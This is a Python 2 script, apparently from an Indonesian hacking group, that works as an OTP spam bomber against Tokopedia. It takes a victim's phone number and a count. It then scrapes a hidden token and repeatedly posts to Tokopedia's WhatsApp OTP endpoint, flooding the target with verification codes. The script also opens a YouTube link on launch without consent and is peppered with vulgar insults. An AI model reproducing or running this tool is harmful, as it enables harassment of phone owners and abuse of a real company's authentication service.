#!/usr/bin/python2

# Author :  AsepAMF
# Team : Pasundar Black Cyber
# Recode Tidak Akan Membuat Anda Menjadi Pencipta Kode kontol :3

from requests import ConnectionError
from time import sleep
import requests, sys, os, re, random

os.system('clear')

M = '\033[1;31m'
H = '\033[1;32m'
K = '\033[1;33m'
U = '\033[1;34m'
P = '\033[1;35m'
C = '\033[1;36m'
W = '\033[1;37m'
A = '\033[90m'

def MesinTik(text):
	for x in text + '\n':
		sys.stdout.write(x)
		sys.stdout.flush()
		sleep(random.random() * 0.05)
	
def MesinTik_2(text):
	for x in text + '\n':
		sys.stdout.write(x)
		sys.stdout.flush()
		sleep(random.random() * 0.02)
	
def Banner():
	MesinTik_2(''+C+'''
                    
   / \   ___  ___ _ __   / \  |  \/  |  ___|
  / _ \ / __|/ _ \ '_ \ / _ \ | |\/| | |_
 / ___ \\__ \  __/ |_) / ___ \| |  | |  _|
/_/   \_\___/\___| .__/_/   \_\_|  |_|_| Maulana Ros Amf
                 |_|
  ____                         __        __    
 / ___| _ __   __ _ _ __ ___   \ \      / /_ _ 
 \___ \| '_ \ / _` | '_ ` _ \   \ \ /\ / / _` |
  ___) | |_) | (_| | | | | | |   \ V  V / (_| |
 |____/| .__/ \__,_|_| |_| |_|    \_/\_/ \__,_|kontol
       |_|                                     
                   '''+W+'Author : AsepAMF\n\t\t   YT : Mamanak Z Official')
                   
def Tokped():
	print
	MesinTik(C+'\t SPAM TOKOPEDIA')
	MesinTik(W+'\t================')
	print
	number = raw_input(''+C+'MASUKKAN NOMOR TARGET'+W+' ('+H+' Ex :'+C+' 0812xxxx '+W+') : ')
	jumlah = input(''+C+'JUMLAH SPAM'+W+' ('+H+' Ex :'+C+' 3 '+W+') : ')
	print
	MesinTik_2(''+C+'-------------- '+W+'Starting'+C+' --------------')
	print
	for x in range(jumlah):
		try:
			
			headers = {
			
			'Connection' : 'keep-alive',
			'Accept' : 'application/json, text/javascript, */*; q=0.01',
			'Origin' : 'https://accounts.tokopedia.com',
			'X-Requested-With' : 'XMLHttpRequest',
			'User-Agent' : '{acak}',
			'Content-Type' : 'application/x-www-form-urlencoded; charset=UTF-8',
			'Accept-Encoding' : 'gzip, deflate',
			
			} 
			
			site = requests.get('https://accounts.tokopedia.com/otp/c/page?otp_type=116&msisdn='+number+'&ld=https%3A%2F%2Faccounts.tokopedia.com%2Fregister%3Ftype%3Dphone%26phone%3D{}%26status%3DeyJrIjp0cnVlLCJtIjp0cnVlLCJzIjpmYWxzZSwiYm90IjpmYWxzZSwiZ2MiOmZhbHNlfQ%253D%253D', headers = headers).text
			search = re.search(r'\<input\ id\=\"Token\"\ value\=\"(.*?)\"\ type\=\"hidden\"\>', site).group(1)
			
			data = {
			
			'otp_type' : '116',
			'msisdn' : number,
			'tk' : search,
			'email' : '',
			'original_param' : '',
			'user_id' : '',
			'signature' : '',
			'number_otp_digit' : '6',
			
			} 
			
			sleep(30) # Jangan Di Rubah Nilai Sleepnya, Itu Udah Default.
			
			sending = requests.post('https://accounts.tokopedia.com/otp/c/ajax/request-wa', headers = headers, data = data)
				
			if 'Anda sudah melakukan 3 kali pengiriman kode' in sending.text:
				print
				print(''+W+'Pengiriman Sudah Limit\nSilahkan Coba 60 Menit Lagi :)')
				break
				
			else:
				print(''+C+'['+W+'*'+C+']'+W+' SPAM KE NOMOR '+C+number+W+' BERHASIL DIKIRIMKAN !')
				
		except ConnectionError:
			print
			print(M+'Cek Koneksi JaringanMu kontol !')
			break
		
		except NameError:
			print
			print(M+'Jumlah Harus Berupa Angka, Bukan Huruf kontol !')
			break
                   
                   
def Spam():
	os.system('clear')
	print(C+'Subscribe YT'+W+' Gua Dlu Su kalo ga gue santet luh !'+C+' :V')
	sleep(1.5)
	os.system('xdg-open https://youtu.be/I5lhnxC2aYI')
	os.system('clear')
	sleep(1.3)
	Banner()
	print
	print
	print(C+'MENU'+W+' :')
	print(C+'\t['+W+'1'+C+']'+W+' SPAM TOKOPEDIA'+C+' ( '+H+'Aktif'+C+' )')
	print
	
	try:
		
		pilih = input(C+'PILIH MENU'+W+' \xE2\x9E\xA4 '+C+'')
		if pilih == 1:
			Tokped() 
		elif pilih == 2:
			RupaRupa()
		else:
			pass
			
	except NameError:
		print
		print(M+'Pilih Menu Harus Berupa Angka, Bukan Huruf !')
		sys.exit()
			
if __name__ == '__main__':
	Spam()
